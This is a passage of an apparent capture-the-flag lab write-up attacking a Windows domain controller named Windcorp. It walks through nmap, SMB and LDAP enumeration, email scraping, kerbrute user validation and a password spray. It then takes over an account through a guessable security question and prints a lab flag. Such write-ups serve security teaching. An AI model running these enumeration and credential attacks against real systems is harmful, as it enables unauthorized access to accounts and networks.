+| v5vQYKlOGq5FI6Mf9ni7S1pXSqF4U9wuqZy4q4tXWAVootmJv1DIgfSMLvXplN9T
+| LucP
+|_-----END CERTIFICATE-----
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5222-TCP:V=7.95%I=7%D=7/7%Time=686BD745%P=x86_64-pc-linux-gnu%r(RPC
+SF:Check,9B,"<stream:error\x20xmlns:stream=\"http://etherx\.jabber\.org/st
+SF:reams\"><not-well-formed\x20xmlns=\"urn:ietf:params:xml:ns:xmpp-streams
+SF:\"/></stream:error></stream:stream>");
+Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 31072/tcp): CLEAN (Timeout)
+|   Check 2 (port 10283/tcp): CLEAN (Timeout)
+|   Check 3 (port 26048/udp): CLEAN (Timeout)
+|   Check 4 (port 18607/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-07-07T14:18:54
+|_  start_date: N/A
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jul  7 10:19:54 2025 <span class="flag">--</span> 1 IP address (1 host up) scanned in 102.69 seconds
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The scan shows multiple open ports, many of which are typical of an Active Directory Domain Controller.</p>
+<p>Key findings:</p>
+<ul>
+<li><strong>Port 80:</strong> Microsoft IIS 10.0, hosting a site titled <code>Windcorp</code>.</li>
+<li><strong>Ports 88, 389, 445, 3268:</strong> Commonly used by Active Directory services (Kerberos, LDAP, SMB).</li>
+<li><strong>Port 3389:</strong> Remote Desktop Protocol (RDP) is enabled.</li>
+<li><strong>Ports 7070 and 7443:</strong> Jetty HTTP services, with 7443 over HTTPS.</li>
+<li><strong>Ports 5222 and 5269:</strong> Openfire XMPP (chat service).</li>
+<li><strong>Ports 9090 and 9091:</strong> Apache Hadoop service.
+From the <code>rdp-ntlm-info</code> script, we also discover crucial details:</li>
+<li><strong>Hostname:</strong> <code>FIRE</code></li>
+<li><strong>Domain:</strong> <code>windcorp.thm</code></li>
+<li><strong>Full FQDN:</strong> <code>fire.windcorp.thm</code></li>
+<li><strong>Domain NetBIOS:</strong> <code>WINDCORP</code></li>
+</ul>
+<p>This confirms the target is likely an Active Directory Domain Controller with various exposed services. We update our <code>/etc/hosts</code> file to resolve the domain and hostname</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"10.10.22.233 fire fire.windcorp.thm windcorp.thm"</span> | tee <span class="flag">-a</span> /etc/hosts
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<hr>
+<h3 id="smb-null-authentication-t1203">SMB Null Authentication (T1203)<a hidden class="anchor" aria-hidden="true" href="#smb-null-authentication-t1203">#</a></h3>
+<p>Before diving into the web server, I tried some basic unauthenticated checks against SMB and LDAP to see if I could get any quick wins</p>
+<p>First, an SMB null session check to see if any shares are anonymously accessible</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target  <span class="flag">-u</span> <span class="string">''</span> <span class="flag">-p</span> <span class="string">''</span> <span class="flag">--shares</span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-success">[+]</span> windcorp.thm\: 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Access denied. No luck there. Next, I&rsquo;ll try an anonymous bind against LDAP to see if I can dump any information about the domain structure</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-s</span> base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=windcorp,DC=thm
+namingcontexts: CN=Configuration,DC=windcorp,DC=thm
+namingcontexts: CN=Schema,CN=Configuration,DC=windcorp,DC=thm
+namingcontexts: DC=ForestDnsZones,DC=windcorp,DC=thm
+namingcontexts: DC=DomainDnsZones,DC=windcorp,DC=thm
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-b</span> <span class="string">'DC=windcorp,DC=thm'</span>
+# extended LDIF
+#
+# LDAPv3
+# base <DC=windcorp,DC=thm> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A57, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>LDAP reveals naming contexts but deeper access requires valid credentials.</p>
+<h3 id="web-and-user-enumeration-t1592">Web and User Enumeration (T1592)<a hidden class="anchor" aria-hidden="true" href="#web-and-user-enumeration-t1592">#</a></h3>
+<p>The website on port 80 is for a company called <strong>Windcorp.</strong> It has a password reset page that asks for a username and a security question. This looks like a potential entry point</p>
+<img src="/img/RA/resetpass.png" alt="" class="img-responsive" loading="lazy" />
+<p>I ran <code>gobuster</code> to look for hidden directories, which confirmed the <code>reset.asp</code> page and a few other standard directories</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">gobuster</span> dir <span class="flag">-u</span> http://10.10.22.233/ <span class="flag">-w</span> /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt <span class="flag">-x</span> asp
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+<span class="indicator-success">[+]</span> Url:                     http://10.10.22.233/
+<span class="indicator-success">[+]</span> Method:                  GET
+<span class="indicator-success">[+]</span> Threads:                 10
+<span class="indicator-success">[+]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
+<span class="indicator-success">[+]</span> Negative Status codes:   404
+<span class="indicator-success">[+]</span> User Agent:              gobuster/3.6
+<span class="indicator-success">[+]</span> Extensions:              asp
+<span class="indicator-success">[+]</span> Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 301) [Size: 147] [--> http://10.10.22.233/css/]
+/img                  (Status: 301) [Size: 147] [--> http://10.10.22.233/img/]
+/.                    (Status: 200) [Size: 11334]
+/check.asp            (Status: 200) [Size: 971]
+/reset.asp            (Status: 200) [Size: 1598]
+...SNIP...
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>I don&rsquo;t have any usernames yet, so I check the home page and find a list of employee emails</p>
+<img src="/img/RA/IT.png" alt="" class="img-responsive" loading="lazy" />
+<p>These names are useful for building usernames. We scrape emails from the source code</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">curl</span> <span class="flag">-s</span> http://10.10.22.233/ | grep <span class="flag">-oP</span> <span class="string">'[\w.]+@fire\.windcorp\.thm'</span> | sort <span class="flag">-u</span> | tee users.txt
+angrybird253@fire.windcorp.thm
+brownostrich284@fire.windcorp.thm
+buse@fire.windcorp.thm
+Edeltraut@fire.windcorp.thm
+Edward@fire.windcorp.thm
+Emile@fire.windcorp.thm
+goldencat416@fire.windcorp.thm
+happymeercat399@fire.windcorp.thm
+orangegorilla428@fire.windcorp.thm
+organicfish718@fire.windcorp.thm
+organicwolf509@fire.windcorp.thm
+sadswan869@fire.windcorp.thm
+tinygoose102@fire.windcorp.thm
+tinywolf424@fire.windcorp.thm
+whiteleopard529@fire.windcorp.thm
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<h3 id="validating-domain-users-with-kerberos-t1201">Validating Domain Users with Kerberos (T1201)<a hidden class="anchor" aria-hidden="true" href="#validating-domain-users-with-kerberos-t1201">#</a></h3>
+<p>I use <code>kerbrute</code> to validate which of these are actual domain users</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">kerbrute</span> userenum <span class="flag">-d</span> windcorp.thm <span class="flag">--dc</span> fire.windcorp.thm users.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 07/07/25 - Ronnie Flathers @ropnop
+
+2025/07/07 13:53:33 >  Using KDC(s):
+2025/07/07 13:53:33 >   fire.windcorp.thm:88
+
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Edeltraut@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Emile@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       organicfish718@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       angrybird253@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       happymeercat399@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       goldencat416@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       orangegorilla428@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       buse@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       brownostrich284@windcorp.thm
+2025/07/07 13:53:33 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Edward@windcorp.thm
+2025/07/07 13:53:34 >  <span class="indicator-success">[+]</span> VALID USERNAME:       tinygoose102@windcorp.thm
+2025/07/07 13:53:34 >  <span class="indicator-success">[+]</span> VALID USERNAME:       whiteleopard529@windcorp.thm
+2025/07/07 13:53:34 >  <span class="indicator-success">[+]</span> VALID USERNAME:       sadswan869@windcorp.thm
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>With a list of valid users, my first thought is to try a password spray. I&rsquo;ll generate a custom wordlist from the website content using <code>cewl</code> and try those words as passwords</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">cewl</span> <span class="flag">-m</span> 6 http://10.10.22.233/ <span class="flag">-w</span> cewl-windcorp.txt
+CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb fire.windcorp.thm <span class="flag">-u</span> users.txt <span class="flag">-p</span> cewl-windcorp.txt                      
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> windcorp.thm\angrybird253@fire.windcorp.thm:Windcorp STATUS_LOGON_FAILURE 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> windcorp.thm\brownostrich284@fire.windcorp.thm:Windcorp STATUS_LOGON_FAILURE 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-error">[-]</span> windcorp.thm\buse@fire.windcorp.thm:Windcorp STATUS_LOGON_FAILURE
+...SNIP...
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>This came up empty. Time to look for other clues.</p>
+<h3 id="resetting-lilys-password-t1098">Resetting Lily’s Password (T1098)<a hidden class="anchor" aria-hidden="true" href="#resetting-lilys-password-t1098">#</a></h3>
+<p>The homepage has a section for employee profiles. One user, <code>Lily Levesque</code>, has a picture with her dog. The image filename is <code>lilyleAndSparky.jpg</code></p>
+
+<div class="ctf-bullet-list">
+    <ul>
+<li>
+<img src="/img/RA/sparky.png" alt="sparky" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<img src="/img/RA/sparky_filename.png" alt="sparky_filename" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>This is a huge hint. I go back to the password reset page, enter <code>lilyle</code> as the username, and try &ldquo;Sparky&rdquo; for the security question &ldquo;What is/was your favorite pets name?&rdquo;</p>
+</li>
+</ul>
+</div>
+
+<style>
+.ctf-bullet-list ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 16px 0;
+}
+
+.ctf-bullet-list li {
+    position: relative;
+    padding-left: 32px;
+    margin-bottom: 20px;
+}
+
+.ctf-bullet-list li::before {
+    content: '';
+    position: absolute;
+    left: 4px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    background-color: #9fef00;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+    z-index: 2;
+}
+
+.ctf-bullet-list li::after {
+    content: '';
+    position: absolute;
+    left: 9px;
+    top: 18px;
+    width: 2px;
+    height: calc(100% + 20px);
+    background-color: #6ba600;
+    z-index: 1;
+}
+
+.ctf-bullet-list li:last-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li:only-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li > p {
+    margin: 0 0 8px 0;
+}
+
+.ctf-bullet-list li > p:last-child {
+    margin-bottom: 0;
+}
+
+.ctf-bullet-list li img {
+    margin: 8px 0;
+    max-width: 100%;
+    height: auto;
+}
+
+.ctf-bullet-list li > ul {
+    margin-top: 8px;
+    padding-left: 20px;
+}
+
+.ctf-bullet-list li > ul li::before {
+    background-color: #9fef00;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+}
+
+.ctf-bullet-list li > ul li::after {
+    background-color: #6ba600;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    }
+    
+    70% {
+        transform: scale(1);
+        box-shadow: 0 0 0 10px rgba(159, 239, 0, 0);
+    }
+    
+    100% {
+        transform: scale(0.95);
+        box-shadow: 0 0 0 0 rgba(159, 239, 0, 0);
+    }
+}
+</style>
+<img src="/img/RA/passwordreset.png" alt="passwordreset" class="img-responsive" loading="lazy" />
+<p>It works! I&rsquo;m able to reset her password to <code>ChangeMe#1234</code>. I now have my initial foothold.</p>
+<hr>
+<h1 id="2-initial-access--the-spark-client-rabbit-hole-t1078">2. Initial Access &amp; The Spark Client Rabbit Hole (T1078)<a hidden class="anchor" aria-hidden="true" href="#2-initial-access--the-spark-client-rabbit-hole-t1078">#</a></h1>
+<p>I re-run Kerbrute first to confirm these new users are valid domain users</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">kerbrute</span> userenum <span class="flag">-d</span> windcorp.thm <span class="flag">--dc</span> fire.windcorp.thm users.txt     
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 07/07/25 - Ronnie Flathers @ropnop
+
+2025/07/07 14:14:13 >  Using KDC(s):
+2025/07/07 14:14:13 >   fire.windcorp.thm:88
+
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       angrybird253@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       orangegorilla428@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Emile@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       buse@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Edward@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       brownostrich284@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Edeltraut@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       organicfish718@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       happymeercat399@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       goldencat416@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       tinygoose102@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       sadswan869@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       lilyle@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       whiteleopard529@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       Emilieje@windcorp.thm
+2025/07/07 14:14:13 >  <span class="indicator-success">[+]</span> VALID USERNAME:       kirkug@windcorp.thm
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>With credentials for <code>lilyle</code>, I can now properly enumerate the SMB shares</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target <span class="flag">-u</span> lilyle <span class="flag">-p</span> <span class="string">'ChangeMe#1234'</span> <span class="flag">--shares</span> 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False) 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-success">[+]</span> windcorp.thm\lilyle:ChangeMe#1234 
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="indicator-info">[*]</span> Enumerated shares
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="row-header">Share           Permissions     Remark</span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span class="flag">-----</span>           <span class="flag">-----------</span>     <span class="flag">------</span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span style="color: orange; font-weight:bold">ADMIN$</span>                          <span style="color: orange; font-weight:bold">Remote Admin</span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span style="color: orange; font-weight:bold">C$</span>                              <span style="color: orange; font-weight:bold">Default share</span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span style="color: orange; font-weight:bold">IPC$            READ            Remote IPC</span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span style="color: orange; font-weight:bold">NETLOGON        READ            Logon server share</span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span style="color: orange; font-weight:bold">Shared          READ</span>            
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span style="color: orange; font-weight:bold">SYSVOL          READ            Logon server share </span>
+<span class="smb">SMB</span>         10.10.22.233    445    FIRE             <span style="color: orange; font-weight:bold">Users           READ</span>       
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>The <code>Shared</code> drive is accessible. Inside, I find the first flag and, more importantly, installers for the Spark XMPP client, version 2.8.3</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">smbclient.py</span> <span class="string">'windcorp.thm/lilyle:ChangeMe#1234@10.10.22.233'</span>
+Impacket v0.13.0.dev0+20250327.181549.7078e935 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Shared
+# ls
+drw-rw-rw-          0  Fri May 29 20:45:42 2020 .
+drw-rw-rw-          0  Fri May 29 20:45:42 2020 ..
+<span class="flag">-rw-rw-rw-</span>         45  Fri May  1 11:32:36 2020 Flag 1.txt
+<span class="flag">-rw-rw-rw-</span>   29526628  Fri May 29 20:45:01 2020 spark_2_8_3.deb
+<span class="flag">-rw-rw-rw-</span>   99555201  Sun May  3 07:08:39 2020 spark_2_8_3.dmg
+<span class="flag">-rw-rw-rw-</span>   78765568  Sun May  3 07:08:39 2020 spark_2_8_3.exe
+<span class="flag">-rw-rw-rw-</span>  123216290  Sun May  3 07:08:39 2020 spark_2_8_3.tar.gz
+# get Flag 1.txt
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-flag-container">
+    <div class="flag-icon">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M4 4V20H6V15H14L13 13H20V4H4Z" fill="currentColor"/>
+        </svg>
+    </div>
+    <div class="flag-content">
+        
+Flag 1: THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}
+
+    </div>
+</div>
+
+<style>
+.ctf-flag-container {
+    display: flex;
+    align-items: center;
+    background-color: #2d3d1a;
+    color: #9fef00;
+    padding: 12px 16px;
+    border-radius: 6px;
+    margin: 16px 0;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    border: 1px solid #4a5d2a;
+}
+
+.flag-icon {
+    margin-right: 12px;
+    color: #9fef00;
+    flex-shrink: 0;
+}
+
+.flag-content {
+    flex: 1;
+    word-break: break-all;
+}
+
+.flag-content code {
+    background-color: transparent;
+    color: inherit;
+    padding: 0;
+    font-size: inherit;
+}
+</style>
+<p>This is where things get tricky. I download the <code>.deb</code> file, but trying to install it directly on my machine fails due to a Java dependency issue. A cleaner approach is to use a Docker container to create a sandboxed environment. I spin up an Ubuntu container, install <code>openjdk-8-jre</code>, and copy the Spark installer into it</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@:ra ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">docker</span> run <span class="flag">-it</span> <span class="flag">-e</span> DISPLAY=$DISPLAY <span class="flag">-v</span> /tmp/.X11-unix:/tmp/.X11-unix <span class="flag">--name</span> spark-gui ubuntu:20.04
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">docker</span> cp spark_2_8_3.deb spark-gui:/root/
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">docker</span> exec <span class="flag">-it</span> spark-gui bash
+<span style="color:white">root@9c4894cbd09a:~#</span> apt update && apt install <span class="flag">-y</span> openjdk-8-jre
+<span style="color:white">root@9c4894cbd09a:~#</span> dpkg <span class="flag">-i</span> spark_2_8_3.deb
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+
+<div class="ctf-bullet-list">
+    <ul>
+<li>
+<p>After installing Spark inside Docker, I launch the application</p>
+ <img src="/img/RA/installed.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>Attempting to log in fails due to domain resolution, since the container doesn&rsquo;t know about <code>fire.windcorp.thm</code></p>
+ <img src="/img/RA/dns.png" alt="dns" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>I add the domain to the container&rsquo;s <code>/etc/hosts</code> file and enable the two options under <code>Advanced</code> settings in Spark to ensure it connects correctly</p>
+ <img src="/img/RA/cert.png" alt="cert" class="img-responsive" loading="lazy" />
+ <img src="/img/RA/.png" alt="" class="img-responsive" loading="lazy" />
+</li>
+<li>
+<p>Upon logging in, a Java Runtime Environment error occurs:</p>
+</li>
+</ul>
+
+</div>
+
+<style>
+.ctf-bullet-list ul {
+    list-style: none;
+    padding-left: 0;
+    margin: 16px 0;
+}
+
+.ctf-bullet-list li {
+    position: relative;
+    padding-left: 32px;
+    margin-bottom: 20px;
+}
+
+.ctf-bullet-list li::before {
+    content: '';
+    position: absolute;
+    left: 4px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    background-color: #9fef00;
+    border-radius: 50%;
+    box-shadow: 0 0 0 0 rgba(159, 239, 0, 0.7);
+    animation: pulse 2s infinite;
+    z-index: 2;
+}
+
+.ctf-bullet-list li::after {
+    content: '';
+    position: absolute;
+    left: 9px;
+    top: 18px;
+    width: 2px;
+    height: calc(100% + 20px);
+    background-color: #6ba600;
+    z-index: 1;
+}
+
+.ctf-bullet-list li:last-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li:only-child::after {
+    display: none;
+}
+
+.ctf-bullet-list li > p {
+    margin: 0 0 8px 0;
+}
+
+.ctf-bullet-list li > p:last-child {
+    margin-bottom: 0;
+}
+
+.ctf-bullet-list li img {
+    margin: 8px 0;
+    max-width: 100%;
+    height: auto;
+}
+
+.ctf-bullet-list li > ul {
+    margin-top: 8px;
+    padding-left: 20px;
+}
+
+.ctf-bullet-list li > ul li::before {
+    background-color: #9fef00;
